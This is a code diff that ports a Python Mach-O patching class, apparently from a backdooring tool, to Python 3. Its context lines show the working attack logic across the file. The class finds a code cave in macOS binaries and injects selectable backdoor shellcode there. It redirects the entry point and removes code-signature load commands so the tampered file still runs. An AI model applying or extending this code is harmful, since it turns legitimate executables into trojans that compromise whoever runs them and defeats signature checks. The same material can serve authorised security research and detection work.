@@ -77,17 +77,17 @@ class machobin():
         if self.SUPPORT_CHECK is True:
             #Exit out either way
             if not self.FILE:
-                print "You must provide a file to see if it is supported (-f)"
+                print("You must provide a file to see if it is supported (-f)")
                 return False
             try:
                 self.support_check()
-            except Exception, e:
-                print 'Exception:', str(e), '%s' % self.FILE
+            except Exception as e:
+                print('Exception:', str(e), '%s' % self.FILE)
             if self.supported is False:
-                print "%s is not supported." % self.FILE
+                print("%s is not supported." % self.FILE)
                 return False
             else:
-                print "%s is supported." % self.FILE
+                print("%s is supported." % self.FILE)
                 return True
 
         self.support_check()
@@ -95,16 +95,16 @@ class machobin():
         return result
 
     def support_check(self):
-        print "[*] Checking file support"
+        print("[*] Checking file support")
         with open(self.FILE, 'r+b') as self.bin:
             check = self.get_structure()
             if check is False:
                 self.supported = False
 
-            for key, value in self.load_cmds.iteritems():
+            for key, value in self.load_cmds.items():
                 self.ImpValues[key] = self.find_Needed_Items(value)
                 if self.ImpValues[key]['text_segment'] == {}:
-                    print '[!] Not a proper Mach-O file'
+                    print('[!] Not a proper Mach-O file')
                     self.supported = False
 
     
@@ -129,9 +129,9 @@ class machobin():
                 continue
             
             if len(afile.split(".")) > 2:
-                print "!" * 50
-                print "\t[!] Make sure there are no '.' in your preprocessor filename:", afile
-                print "!" * 50
+                print("!" * 50)
+                print("\t[!] Make sure there are no '.' in your preprocessor filename:", afile)
+                print("!" * 50)
                 
                 return False
             
@@ -140,12 +140,12 @@ class machobin():
             preprocessor_name = __import__( name, fromlist=[''])
             
             if preprocessor_name.enabled is True:
-                print "[*] Executing preprocessor:", afile.strip(".py")
+                print("[*] Executing preprocessor:", afile.strip(".py"))
             else:
                 continue
 
             if preprocessor_name.file_format.lower() in ['macho', 'all']: #'elf', 'macho', 'mach-o']:
-                print '[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"
+                print('[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats")
             else:
                 continue
             
@@ -159,24 +159,24 @@ class machobin():
                 self.tmp_file = tempfile.NamedTemporaryFile()
                 self.tmp_file.write(open(self.FILE, 'rb').read())
                 self.tmp_file.seek(0)
-                print "[*] Creating temp file:", self.tmp_file.name
+                print("[*] Creating temp file:", self.tmp_file.name)
             else:
-                print "[*] Using existing tempfile from prior preprocessor"
+                print("[*] Using existing tempfile from prior preprocessor")
             
             load_name = name +  ".preprocessor"
             preproc = self.loadthis(load_name)
             
             m = preproc(self)
             
-            print "=" * 50
+            print("=" * 50)
             
             # execute preprocessor
             result = m.run()
             
             if result is False:
-                print "[!] Preprocessor Failure :("
+                print("[!] Preprocessor Failure :(")
 
-            print "=" * 50
+            print("=" * 50)
             
             # After running push it to BDF.
             
@@ -186,7 +186,7 @@ class machobin():
             if preprocessor_name.recheck_support is True:
                 issupported = self.support_check()
                 if issupported is False:
-                    print self.FILE, "is not supported."
+                    print(self.FILE, "is not supported.")
                     return False                
 
     def output_options(self):
@@ -199,7 +199,7 @@ class machobin():
     def set_shells(self, MagicNumber, ):
         "This function sets the shellcode."
 
-        print "[*] Looking for and setting selected shellcode"
+        print("[*] Looking for and setting selected shellcode")
 
         avail_shells = []
 
@@ -212,7 +212,7 @@ class machobin():
             self.bintype = macho_intel64_shellcode
 
         if not self.SHELL:
-            print "You must choose a backdoor to add: "
+            print("You must choose a backdoor to add: ")
             for item in dir(self.bintype):
                 if "__" in item:
                     continue
@@ -224,10 +224,10 @@ class machobin():
                       or 'returnshellcode' in item):
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print("   {0}".format(item))
             return False
         if self.SHELL not in dir(self.bintype):
-            print "The following %ss are available:" % str(self.bintype).split(".")[1]
+            print("The following %ss are available:" % str(self.bintype).split(".")[1])
             for item in dir(self.bintype):
                 #print item
                 if "__" in item:
@@ -240,7 +240,7 @@ class machobin():
                       or 'returnshellcode' in item):
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print("   {0}".format(item))
                     avail_shells.append(item)
             self.avail_shells = avail_shells
             return False
@@ -255,12 +255,12 @@ class machobin():
         '''This function grabs necessary data for the mach-o format'''
         self.binary_header = self.bin.read(4)
         if self.binary_header == "\xca\xfe\xba\xbe":
-            print '[*] Fat File detected'
+            print('[*] Fat File detected')
             self.FAT_FILE = True
             ArchNo = struct.unpack(">I", self.bin.read(4))[0]
             for arch in range(ArchNo):
                 self.fat_hdrs[arch] = self.fat_header()
-            for hdr, value in self.fat_hdrs.iteritems():
+            for hdr, value in self.fat_hdrs.items():
                 if int(value['CPU Type'], 16) in self.supported_CPU_TYPES:
                     self.bin.seek(int(value['Offset'], 16), 0)
                     self.mach_hdrs[hdr] = self.mach_header()
@@ -288,7 +288,7 @@ class machobin():
         try:
             header['MagicNumber'] = hex(struct.unpack("<I", self.bin.read(4))[0])
         except:
-            print "[!] Not a properly formated Mach-O file"
+            print("[!] Not a properly formated Mach-O file")
             return False
         header['CPU Type'] = hex(struct.unpack("<I", self.bin.read(4))[0])
         header['CPU SubType'] = hex(struct.unpack("<I", self.bin.read(4))[0])
@@ -497,7 +497,7 @@ class machobin():
     def patch_macho(self):
 
         if self.supported is False:
-            print self.FILE, "is not supported."
+            print(self.FILE, "is not supported.")
             return False
 
         self.output_options()
@@ -517,7 +517,7 @@ class machobin():
 
         shutil.copy2(self.FILE, self.backdoorfile)
 
-        for key, value in self.mach_hdrs.iteritems():
+        for key, value in self.mach_hdrs.items():
             MagicNumber = value['MagicNumber']
             text_section = self.ImpValues[key]['text_section']
             last_cmd = self.ImpValues[key]['last_cmd']
@@ -542,35 +542,35 @@ class machobin():
 
             with open(self.backdoorfile, 'r+b') as bin:
                 if MagicNumber == '0xfeedfacf' and patchx64 is True:
-                    print "[*] Patching x86_64 Mach-O Binary"
+                    print("[*] Patching x86_64 Mach-O Binary")
                     cave_size = struct.unpack("<I", text_section['Offset'])[0] + offset - last_cmd
-                    print "[*] Pre-text section 'code cave' size:", hex(cave_size)
+                    print("[*] Pre-text section 'code cave' size:", hex(cave_size))
 
                     resultShell = self.set_shells(MagicNumber)
                     if not resultShell:
-                        print "[!] Could not set shell"
+                        print("[!] Could not set shell")
                         return False
 
                     if len(self.shellcode) > cave_size:
-                        print "[!] Shellcode is larger than available space"
+                        print("[!] Shellcode is larger than available space")
                         return False
 
                     startingLocation = struct.unpack("<I", text_section['Offset'])[0] + offset - len(self.shellcode)
 
                     if LC_UNIXTREAD != {}:
-                        print "[*] ...with LC_UNIXTREAD format"
+                        print("[*] ...with LC_UNIXTREAD format")
                         #print 'LC_UNIXTREAD', struct.unpack("<Q", LC_UNIXTREAD['rip'])[0], struct.unpack("<Q", text_section['Address'])[0]
                         if struct.unpack("<Q", LC_UNIXTREAD['rip'])[0] - struct.unpack("<Q", text_section['Address'])[0] != 0x0:
                             self.jumpLocation = struct.unpack("<Q", LC_UNIXTREAD['rip'])[0] - struct.unpack("<Q", text_section['Address'])[0]
                     else:
-                        print "[*] ...with LC_MAIN format"
+                        print("[*] ...with LC_MAIN format")
                         #print struct.unpack("<Q", LC_MAIN['EntryOffset'])[0], struct.unpack("<I", text_section['Offset'])[0]
                         if struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0] != 0x0:
                             self.jumpLocation = struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0]
 
                     resultShell = self.set_shells(MagicNumber)
                     if not resultShell:
-                        print "[!] Could not set shell"
+                        print("[!] Could not set shell")
                         return False
                     #print 'shellcode:', self.shellcode.encode('hex')
 
@@ -591,34 +591,34 @@ class machobin():
                         bin.write(struct.pack("<Q", newOffset))
 
                 elif MagicNumber == '0xfeedface' and patchx86 is True:
-                    print "[*] Patching x86 (i386) Mach-O Binary"
+                    print("[*] Patching x86 (i386) Mach-O Binary")
                     cave_size = struct.unpack("<I", text_section['Offset'])[0] + offset - last_cmd
-                    print "[*] Pre-text section 'code cave' size:", hex(cave_size)
+                    print("[*] Pre-text section 'code cave' size:", hex(cave_size))
 
                     resultShell = self.set_shells(MagicNumber)
                     if not resultShell:
-                        print "[!] Could not set shell"
+                        print("[!] Could not set shell")
                         return False
 
                     if len(self.shellcode) > cave_size:
-                        print "[!] Shellcode is larger than available space"
+                        print("[!] Shellcode is larger than available space")
                         return False
 
                     #FIND Current Location
                     startingLocation = struct.unpack("<I", text_section['Offset'])[0] + offset - len(self.shellcode)
 
                     if LC_UNIXTREAD != {}:
-                        print "[*] ...with LC_UNIXTREAD format"
+                        print("[*] ...with LC_UNIXTREAD format")
                         if struct.unpack("<I", LC_UNIXTREAD['eip'])[0] - struct.unpack("<I", text_section['Address'])[0] != 0x0:
                             self.jumpLocation = struct.unpack("<I", LC_UNIXTREAD['eip'])[0] - struct.unpack("<I", text_section['Address'])[0]
                     else:
-                        print "[*] ...with LC_Main format"
+                        print("[*] ...with LC_Main format")
                         if struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0] != 0x0:
                             self.jumpLocation = struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0]
 
                     resultShell = self.set_shells(MagicNumber)
                     if not resultShell:
-                        print "[!] Could not set shell"
+                        print("[!] Could not set shell")
                         return False
 
                     bin.seek(startingLocation, 0)
@@ -638,11 +638,11 @@ class machobin():
                         bin.write(struct.pack("<I", newOffset))
 
                 else:
-                    print "[!] Not patching this arch:", MagicNumber
+                    print("[!] Not patching this arch:", MagicNumber)
                     continue
 
                 if LC_CODE_SIGNATURE != {}:
-                    print "[*] Removing LC_CODE_SIGNATURE command"
+                    print("[*] Removing LC_CODE_SIGNATURE command")
                     bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                     oldNumber = struct.unpack("<I", bin.read(4))[0]
                     bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
@@ -652,7 +652,7 @@ class machobin():
                     bin.write(struct.pack("<I", oldsize - 0x10))
 
                 if LC_DYLIB_CODE_SIGN_DRS != {}:
-                    print "[*] Removing LC_DYLIB_CODE_SIGN_DRS command"
+                    print("[*] Removing LC_DYLIB_CODE_SIGN_DRS command")
                     bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                     oldNumber = struct.unpack("<I", bin.read(4))[0]
                     bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
@@ -661,14 +661,14 @@ class machobin():
                     bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)
                     bin.write(struct.pack("<I", oldsize - 0x10))
 
-        print "[!] Patching Complete"
+        print("[!] Patching Complete")
 
         # CHECK AND DELETE TMP FILE HERE
         
         if self.tmp_file != None:
             if self.keep_temp is True:
                 # tmpfilename_orginalname.exe
-                print "[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
+                print("[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE) 
                 shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
             try:
                 shutil.rmtree(self.tmp_file.name)
